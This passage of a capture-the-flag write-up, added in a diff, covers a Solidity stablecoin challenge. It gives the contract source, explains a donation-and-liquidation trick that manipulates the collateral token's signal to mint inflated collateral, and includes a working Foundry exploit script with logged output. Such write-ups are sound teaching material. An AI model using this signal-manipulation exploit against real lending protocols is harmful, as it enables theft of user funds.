+        revert();
+    }
+
+    function transferFrom(address, address, uint256) public virtual override returns (bool) {
+        revert();
+    }
+
+    function increaseAllowance(address, uint256) public virtual override returns (bool) {
+        revert();
+    }
+
+    function decreaseAllowance(address, uint256) public virtual override returns (bool) {
+        revert();
+    }
+}
+
+contract Manager is Ownable {
+    using SafeERC20 for IERC20;
+    using ProtocolMath for uint256;
+
+    uint256 public constant MIN_DEBT = 3000e18;
+    uint256 public constant MIN_CR = 130 * ProtocolMath.ONE / 100; // 130%
+    uint256 public constant DECAY_FACTOR = 999_027_758_833_783_000;
+
+    Token public immutable mim;
+
+    mapping(address => IERC20) public positionCollateral;
+    mapping(IERC20 => Collateral) public collateralData;
+
+    struct Collateral {
+        ERC20Signal protocolCollateralToken;
+        ERC20Signal protocolDebtToken;
+        PriceFeed priceFeed;
+        uint256 operationTime;
+        uint256 baseRate;
+    }
+
+    error NothingToLiquidate();
+    error CannotLiquidateLastPosition();
+    error RedemptionSpreadOutOfRange();
+    error NoCollateralOrDebtChange();
+    error InvalidPosition();
+    error NewICRLowerThanMCR(uint256 newICR);
+    error NetDebtBelowMinimum(uint256 netDebt);
+    error FeeExceedsMaxFee(uint256 fee, uint256 amount, uint256 maxFeePercentage);
+    error PositionCollateralTokenMismatch();
+    error CollateralTokenAlreadyAdded();
+    error CollateralTokenNotAdded();
+    error SplitLiquidationCollateralCannotBeZero();
+    error WrongCollateralParamsForFullRepayment();
+
+    constructor() {
+        mim = new Token(address(this), "MIM");
+    }
+
+    function manage(
+        IERC20 token,
+        uint256 collateralDelta,
+        bool collateralIncrease,
+        uint256 debtDelta,
+        bool debtIncrease
+    ) external returns (uint256, uint256) {
+        if (address(collateralData[token].protocolCollateralToken) == address(0)) {
+            revert CollateralTokenNotAdded();
+        }
+
+        if (positionCollateral[msg.sender] != IERC20(address(0)) && positionCollateral[msg.sender] != token) {
+            revert PositionCollateralTokenMismatch();
+        }
+
+        if (collateralDelta == 0 && debtDelta == 0) {
+            revert NoCollateralOrDebtChange();
+        }
+
+        Collateral memory collateralTokenInfo = collateralData[token];
+        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
+        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
+
+        uint256 debtBefore = protocolDebtToken.balanceOf(msg.sender);
+        if (!debtIncrease && (debtDelta == type(uint256).max || (debtBefore != 0 && debtDelta == debtBefore))) {
+            if (collateralDelta != 0 || collateralIncrease) {
+                revert WrongCollateralParamsForFullRepayment();
+            }
+            collateralDelta = protocolCollateralToken.balanceOf(msg.sender);
+            debtDelta = debtBefore;
+        }
+
+        _updateDebt(token, protocolDebtToken, debtDelta, debtIncrease);
+        _updateCollateral(token, protocolCollateralToken, collateralDelta, collateralIncrease);
+
+        uint256 debt = protocolDebtToken.balanceOf(msg.sender);
+        uint256 collateral = protocolCollateralToken.balanceOf(msg.sender);
+
+        if (debt == 0) {
+            if (collateral != 0) {
+                revert InvalidPosition();
+            }
+            _closePosition(protocolCollateralToken, protocolDebtToken, msg.sender, false);
+        } else {
+            _checkPosition(token, debt, collateral);
+
+            if (debtBefore == 0) {
+                positionCollateral[msg.sender] = token;
+            }
+        }
+        return (collateralDelta, debtDelta);
+    }
+
+    function liquidate(address liquidatee) external {
+        IERC20 token = positionCollateral[liquidatee];
+
+        if (address(token) == address(0)) {
+            revert NothingToLiquidate();
+        }
+
+        Collateral memory collateralTokenInfo = collateralData[token];
+        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
+        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
+
+        uint256 wholeCollateral = protocolCollateralToken.balanceOf(liquidatee);
+        uint256 wholeDebt = protocolDebtToken.balanceOf(liquidatee);
+
+        (uint256 price,) = collateralTokenInfo.priceFeed.fetchPrice();
+        uint256 health = ProtocolMath._computeHealth(wholeCollateral, wholeDebt, price);
+
+        if (health >= MIN_CR) {
+            revert NothingToLiquidate();
+        }
+
+        uint256 totalDebt = protocolDebtToken.totalSupply();
+        if (wholeDebt == totalDebt) {
+            revert CannotLiquidateLastPosition();
+        }
+
+        if (!(health <= ProtocolMath.ONE)) {
+            mim.burn(msg.sender, wholeDebt);
+            totalDebt -= wholeDebt;
+        }
+
+        token.safeTransfer(msg.sender, wholeCollateral);
+
+        _closePosition(protocolCollateralToken, protocolDebtToken, liquidatee, true);
+
+        _updateSignals(token, protocolCollateralToken, protocolDebtToken, totalDebt);
+    }
+
+    function addCollateralToken(IERC20 token, PriceFeed priceFeed, uint256 collateralSignal, uint256 debtSignal)
+        external
+        onlyOwner
+    {
+        ERC20Signal protocolCollateralToken = new ERC20Signal(
+            address(this),
+            collateralSignal,
+            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " collateral")),
+            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-c"))
+        );
+        ERC20Signal protocolDebtToken = new ERC20Signal(
+            address(this),
+            debtSignal,
+            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " debt")),
+            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-d"))
+        );
+
+        if (address(collateralData[token].protocolCollateralToken) != address(0)) {
+            revert CollateralTokenAlreadyAdded();
+        }
+
+        Collateral memory protocolCollateralTokenInfo;
+        protocolCollateralTokenInfo.protocolCollateralToken = protocolCollateralToken;
+        protocolCollateralTokenInfo.protocolDebtToken = protocolDebtToken;
+        protocolCollateralTokenInfo.priceFeed = priceFeed;
+
+        collateralData[token] = protocolCollateralTokenInfo;
+    }
+
+    function _updateDebt(IERC20 token, ERC20Signal protocolDebtToken, uint256 debtDelta, bool debtIncrease) internal {
+        if (debtDelta == 0) {
+            return;
+        }
+
+        if (debtIncrease) {
+            _decayRate(token);
+
+            protocolDebtToken.mint(msg.sender, debtDelta);
+            mim.mint(msg.sender, debtDelta);
+        } else {
+            protocolDebtToken.burn(msg.sender, debtDelta);
+            mim.burn(msg.sender, debtDelta);
+        }
+    }
+
+    function _updateCollateral(
+        IERC20 token,
+        ERC20Signal protocolCollateralToken,
+        uint256 collateralDelta,
+        bool collateralIncrease
+    ) internal {
+        if (collateralDelta == 0) {
+            return;
+        }
+
+        if (collateralIncrease) {
+            protocolCollateralToken.mint(msg.sender, collateralDelta);
+            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
+        } else {
+            protocolCollateralToken.burn(msg.sender, collateralDelta);
+            token.safeTransfer(msg.sender, collateralDelta);
+        }
+    }
+
+    function _updateSignals(
+        IERC20 token,
+        ERC20Signal protocolCollateralToken,
+        ERC20Signal protocolDebtToken,
+        uint256 totalDebtForCollateral
+    ) internal {
+        protocolDebtToken.setSignal(totalDebtForCollateral);
+        protocolCollateralToken.setSignal(token.balanceOf(address(this)));
+    }
+
+    function updateSignal(ERC20Signal token, uint256 signal) external onlyOwner {
+        token.setSignal(signal);
+    }
+
+    function _closePosition(
+        ERC20Signal protocolCollateralToken,
+        ERC20Signal protocolDebtToken,
+        address position,
+        bool burn
+    ) internal {
+        positionCollateral[position] = IERC20(address(0));
+
+        if (burn) {
+            protocolDebtToken.burn(position, type(uint256).max);
+            protocolCollateralToken.burn(position, type(uint256).max);
+        }
+    }
+
+    function _decayRate(IERC20 token) internal {
+        uint256 decayedRate = _calcDecayedRate(token);
+        require(decayedRate <= ProtocolMath.ONE);
+
+        collateralData[token].baseRate = decayedRate;
+
+        _updateOperationTime(token);
+    }
+
+    function _updateOperationTime(IERC20 token) internal {
+        uint256 pastTime = block.timestamp - collateralData[token].operationTime;
+
+        if (1 minutes <= pastTime) {
+            collateralData[token].operationTime = block.timestamp;
+        }
+    }
+
+    function _calcDecayedRate(IERC20 token) internal view returns (uint256) {
+        uint256 pastMinutes = (block.timestamp - collateralData[token].operationTime) / 1 minutes;
+        uint256 decay = ProtocolMath._decPow(DECAY_FACTOR, pastMinutes);
+
+        return collateralData[token].baseRate.mulDown(decay);
+    }
+
+    function _checkPosition(IERC20 token, uint256 debt, uint256 collateral) internal view {
+        if (debt < MIN_DEBT) {
+            revert NetDebtBelowMinimum(debt);
+        }
+
+        (uint256 price,) = collateralData[token].priceFeed.fetchPrice();
+        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
+        if (health < MIN_CR) {
+            revert NewICRLowerThanMCR(health);
+        }
+    }
+
+    receive() external payable {}
+}
+contract Stablecoin {
+    Token public immutable mim;
+    Token public immutable eth;
+    Manager public immutable manager;
+    address public player;
+    constructor(address _player, Token _mim, Token _eth, Manager _manager) {
+        player = _player;
+        mim = _mim;
+        eth = _eth;
+        manager = _manager;
+    }
+    function isSolved() external view returns (bool) {
+        return mim.balanceOf(player) == 50_000_000 ether;
+    }
+}
+```
+{%end%}
+
+## Solution
+
+Bro, this is pain I couldn't remember what I did to solve this. Spent more than 3 days (I know I'm dumb). By doing some magic I was to solve this in the end. I'll try my best to explain that magic. 
+
+Lets break down the StableCoin protocol,
+
+1. **Manager (Main Contract)**
+   - Handles adding collateral tokens, managing positions, and liquidations
+   - Maintains collateral and debt signals for each position
+   - Controls the MIM token minting and burning
+   - Key functions:
+     - `manage()`: Add/remove collateral and debt
+     - `liquidate()`: Liquidate undercollateralized positions
+     - `addCollateralToken()`: Add new collateral types
+     - `updateSignal()`: Update collateral/debt signals
+
+2. **Token**
+   - ERC20 token contract for MIM stablecoin
+   - Can only be minted/burned by the Manager
+
+3. **ERC20Signal**
+   - Special ERC20 implementation for protocol collateral and debt tokens
+   - Uses a signal multiplier for balance calculations
+   - Cannot be transferred (all transfer functions revert)
+   - Key functions:
+     - `mint()`: Mints tokens with signal adjustment
+     - `burn()`: Burns tokens with signal adjustment
+     - `setSignal()`: Updates the signal multiplier
+
+4. **PriceFeed**
+   - Simple price oracle that returns fixed prices
+   - Returns (2207 ether, 0.01 ether) for price and timestamp
+
+5. **Stablecoin**
+   - Challenge contract that sets up the initial state
+   - Holds references to MIM, ETH tokens, and Manager
+
+The goal is to get 50,000,000 MIM tokens when starting with 6000 ETH.
+
+The Manager owner did the following after protocol deployement, 
+ 
+1. The protocol adds ETH as collateral with a simple price feed and very high limits
+2. Creates an initial position with 2 ETH collateral and 3395 MIM debt
+3. Updates the debt token's signal to 3520 ether (this affects debt calculations)
+
+Same routene, initial state of the protocol.
+
+```bash
+  Stablecoin :  0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9
+  Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
+  Manager Owner:  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
+  MIM :  0x7a2B13B63367219128DD46d1ab179a542C17d48a
+  MIM Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
+  ETH :  0xc673093EC4446A0690Aeb98105faeB8528c50693
+  ETH Manager :  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
+  protocolCollateralToken :  0xfe49524fEe1b2FeF5Dff149B1A0370cff0d68972
+  protocolCollateralToken Signal:  20000000000000000000000000000000000
+  protocolCollateralToken totalSupply():  2000000000000000000
+  protocolDebtToken :  0x89cAaD14ca4eEA0272A2654A31A56D0a509E28fF
+  protocolDebtToken Signal :  1036818851251840943
+  protocolDebtToken totalSupply():  3520000000000000001485
+  -------------------------------
+  Manager balance of ETH :  2000000000000000000
+  Manager balance of MIM :  0
+  Manager Owner balance of ETH :  0
+  Manager Owner balance of MIM :  3395000000000000000000
+  Manager Owner balance of protocolCollateralToken :  2000000000000000000
+  Manager Owner balance of protocolDebtToken :  3520000000000000001485
+  Player balance of ETH :  6000000000000000000000
+  Player balance of MIM :  0
+  Player balance of protocolCollateralToken :  0
+  Player balance of protocolDebtToken :  0
+  protocolCollateralToken Signal:  20000000000000000000000000000000000
+  protocolDebtToken Signal :  1036818851251840943
+```
+
+When the Manager owner added the collatoral token as ETH, `protocolCollateralToken` and `protocolDebtToken` will be deployed.  And curresponding signal values are added by the owner. 
+
+Lets do the backtracking, our goal is to get the MIM tokens, where the transfer/mint of MIM happens? In the `_updateDebt()` internal function which is called at once in `manage()`.
+
+So, need to understand what does this `manage()` function do. When called, it can either add or remove ETH collateral and mint or burn MIM tokens. When adding collateral, it transfers ETH from the user to the Manager and mints protocolCollateralToken to the user. When minting MIM, it creates new MIM tokens and mints protocolDebtToken to track the debt. The function uses a signal-based system where both collateral and debt tokens have signal multipliers that affect the actual balances and health calculations. The protocol checks the position's health factor after each operation to ensure proper collateralization.
+
+```solidity
+    function _updateCollateral(
+        IERC20 token,
+        ERC20Signal protocolCollateralToken,
+        uint256 collateralDelta,
+        bool collateralIncrease
+    ) internal {
+        if (collateralDelta == 0) {
+            return;
+        }
+
+        if (collateralIncrease) {
+            protocolCollateralToken.mint(msg.sender, collateralDelta);
+            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
+        } else {
+            protocolCollateralToken.burn(msg.sender, collateralDelta);
+            token.safeTransfer(msg.sender, collateralDelta);
+        }
+    }
+```
+
+If we observe here,  While adding collatoral the collatoral token will be transferred from user to Manager and the `protocolCollateralToken` is also minted to track the user collatoral amount. And this collatoral amount will affects the health of the user. If we closely look at the `protocolCollateralToken.mint(msg.sender, collateralDelta)` line.
+
+```solidity
+function mint(address to, uint256 amount) external onlyManager {
+    _mint(to, amount.divUp(signal));
+}
+```
+
+Hmm, something is interesting, its not the usual mint. mint amount is calculated by doing `divUp` with the `signal`. So, can we make this `divUp()` calculation to result very large amount so that our `protocolCollatoralToken` coallatoral will be high and we can get more `mim` tokens due to increase of collatoral and health factor.
+
+Okay, now how can we do this? By modifying the `signal` value. 
+
+```solidity
+// Manager
+function _updateSignals(
+    IERC20 token,
+    ERC20Signal protocolCollateralToken,
+    ERC20Signal protocolDebtToken,
+    uint256 totalDebtForCollateral
+) internal {
+    protocolDebtToken.setSignal(totalDebtForCollateral);
+    protocolCollateralToken.setSignal(token.balanceOf(address(this)));
+}
+
+// ERC20Signal 
+function setSignal(uint256 backingAmount) external onlyManager {
+    uint256 supply = ERC20.totalSupply();
+    uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
+    signal = newSignal;
+}
+```
+The `_updateSignals()` is called inside the `liquidate()` function. So, liquidating the manager owner will update the signals. The `protocolCollatoralToken` signal is updated with the value of `token.balanceOf(address(this))`, token here is ETH. So, since it is calculating the balance of `address(this)`, i.e manager. We can donate ETH to manager by doing `eth.transfer(address(manager), (large ETH)`. Now this causes an undefined behaviour in `setSignal()` function and the `backingAmount.divUp(supply)` will execute which make the signal value very low than compared to the initial one. 
+
+So, we succeeded in manipulating the `protocolCollatoralToken` signal. Now the signal of the `protocolCollatoralToken` is smaller (at least less than 1e18). Now what happens if we call the `manage()` again with very small increase in `collatoralToken`?
+
+Lets say, we called `manage(eth, 1 , true, 0, false)`. Now ultimately the following `mint()` will execute. So, now the signal showing up here is the manipulated one (we reduced it to less than 1e18). 
+
+```solidity
+function mint(address to, uint256 amount) external onlyManager {
+    _mint(to, amount.divUp(signal));
+}
+
+function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
+    if (a == 0) {
+        return 0;
+    } else {
+        return (((a * ONE) - 1) / b) + 1;
+    }
+}
+````
+
+So, the result from the `divUp()` will be very high. i.e, we are minting more `protocolCollatoralToken` by only sending only `1 wei` of ETH. But this `manage()` with only 1 wei collatoral increase should be done for several times till we got the good health factor. Once we have the very good health factor and we can able to borrow all `50,000,000` MIM in one go. 
+
+Find my messy exploit below,
+
+{% note(clickable=true, header="Stablecoin.s.sol") %}
+
+```solidity
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+import "../src/Stablecoin.sol";
+
+contract StablecoinSolve is Script {
+
+    Stablecoin public stablecoin = Stablecoin(0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9);
+    Manager public manager = stablecoin.manager();
+    Token public mim = stablecoin.mim();
+    Token public eth = stablecoin.eth();
+    address player = vm.envAddress("PLAYER");
+
+    //Manager owner executes the following code:
+
+    // manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);
+
+    // ETH.mint(address(this), 2 ether);
+    // ETH.approve(address(manager), type(uint256).max);
+    // manager.manage(ETH, 2 ether, true, 3395 ether, true);
+
+    // (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
+    // manager.updateSignal(debtToken, 3520 ether);
+
+    function run() external{
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        console.log("Stablecoin : ", address(stablecoin));
+        console.log("Manager : ", address(manager));
+        console.log("Manager Owner: ", address(manager.owner()));
+
+        console.log("MIM : ", address(mim));
+        console.log("MIM Manager : ", address(mim.manager()));
+
+        console.log("ETH : ", address(eth));
+        console.log("ETH Manager : ", address(eth.manager()));
+        
+        (ERC20Signal protocolCollateralToken,
+        ERC20Signal protocolDebtToken,
+        PriceFeed priceFeed,
+        uint256 operationTime,
+        uint256 baseRate ) =  manager.collateralData(IERC20(eth));
+        console.log("protocolCollateralToken : ", address(protocolCollateralToken));
+        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
+        console.log("protocolCollateralToken totalSupply(): ", protocolCollateralToken.totalSupply());
+
+        console.log("protocolDebtToken : ", address(protocolDebtToken));
+        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
+        console.log("protocolDebtToken totalSupply(): ", protocolDebtToken.totalSupply());
+
+        console.log("-------------------------------");
+        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
+        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
+        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
+        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
+        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
+        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
+        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
+        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
+        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
+        console.log("-------------------------------");
+
+
+        console.log("isSolved() : ", stablecoin.isSolved());
+
+        mim.approve(address(manager), type(uint256).max );
+        eth.approve(address(manager), type(uint256).max );
+        manager.manage(eth, 2.1 ether, true, 3521 ether, true);
+        eth.transfer(address(manager), 5990 ether);
+        manager.liquidate(manager.owner());
+        for (uint i = 0; i < 850; i++){
+            manager.manage(eth, 1 , true, 0, false);
+        }
+        manager.manage(eth, 0 , false, 50_000_000 ether , true);
+        mim.transfer(address(0xdeadbeef), mim.balanceOf(player) - 50_000_000 ether);
+
+        
+        console.log("-------------------------------");
+        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
+        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
+        console.log("Manager Owner balance of ETH : ", eth.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of MIM : ", mim.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(manager.owner())));
+        console.log("Manager Owner balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(manager.owner())));
+        console.log("Player balance of ETH : ", eth.balanceOf(address(player)));
+        console.log("Player balance of MIM : ", mim.balanceOf(address(player)));
+        console.log("Player balance of protocolCollateralToken : ", protocolCollateralToken.balanceOf(address(player)));
+        console.log("Player balance of protocolDebtToken : ", protocolDebtToken.balanceOf(address(player)));
+        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
+        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
+        console.log("-------------------------------");
+
+        console.log("isSolved() : ", stablecoin.isSolved());
+        // revert();
+    }
+
+}
+```
+{%end%}
+
+
 ## References 
 1. [Anti Proxy Patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)
+2. [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity)
